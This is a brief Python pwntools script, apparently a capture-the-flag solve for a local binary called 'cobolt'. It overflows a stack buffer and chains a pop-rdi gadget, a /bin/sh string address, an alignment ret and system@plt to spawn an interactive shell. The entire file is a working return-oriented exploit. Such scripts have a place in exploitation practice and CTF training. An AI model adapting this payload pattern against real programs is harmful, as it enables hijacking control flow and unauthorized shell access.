from pwn import *

p = process("./cobolt")

pop_rdi = 0x401353
binsh = 0x404060
system_plt = 0x4010b0

p.recvuntil(b"You can use write, read, system and /bin/sh\n")

payload = b'A'*0x40
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi+1)
payload += p64(system_plt)
p.send(payload)

p.interactive()